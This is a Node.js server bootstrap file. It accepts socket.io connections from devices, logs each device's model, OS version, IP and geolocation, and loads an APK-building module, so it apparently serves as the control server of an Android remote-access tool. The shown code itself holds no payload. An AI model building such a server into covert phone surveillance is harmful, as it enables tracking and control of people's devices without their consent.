const
    express = require('express'),
    app = express(),
    http = require('http'),
    server = http.createServer(app),
    IO = require('socket.io')(server), // create a socket.io server by passing the http.Server object
    geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

IO.sockets.pingInterval = 30000;
IO.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.connection;

    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }

});

// my initial thoughts on admin sys
server.listen(CONST.web_port); // use server.listen instead of app.listen

app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));

// dotenv and other code goes here

// I am clueless about the next four lines of code. Akin suggested it

const dotenv = require('dotenv');

dotenv.config();

const myVar = process.env.PORT;
console.log(myVar);

// God abeg o! 